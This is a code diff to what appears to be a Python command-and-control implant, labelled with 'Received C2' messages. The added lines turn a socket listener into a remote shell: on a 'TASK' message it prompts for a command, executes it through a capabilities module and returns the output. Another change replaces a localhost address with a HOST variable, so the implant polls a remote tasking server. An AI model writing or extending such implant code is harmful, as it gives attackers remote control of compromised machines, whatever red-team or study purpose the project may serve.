@@ -17,6 +17,16 @@ def comms_thread():
         COMX,COMX_ADDR = COMMS.accept()
         task = COMX.recv(1024)
         print(f"Received C2: {task.decode()}")
+
+        if "TASK" in task.decode().upper():
+            COMX.send(b"Enter your command: ")
+            run_me = COMX.recv(1024)
+            output = capabilities.run(run_me.decode())
+            send_str = f"The result of `{run_me.decode().strip()}` is {output}" 
+            COMX.send(send_str.encode())
+        else:
+            COMX.send((f"I'm not familiar with the task {task.decode().upper()}").encode())
+
         COMX.close()
 
 def tasking_thread():
@@ -29,7 +39,7 @@ def tasking_thread():
         sleep_timer = MAX_TIMER
 
 #------------- Check for Tasking -------------#
-        check_tasking('127.0.0.1','9090')
+        check_tasking(HOST,'9090')
 
 #------------- Execute Tasking -------------#
         tasking_fh = open("./tasks-grabbed.txt",'r')
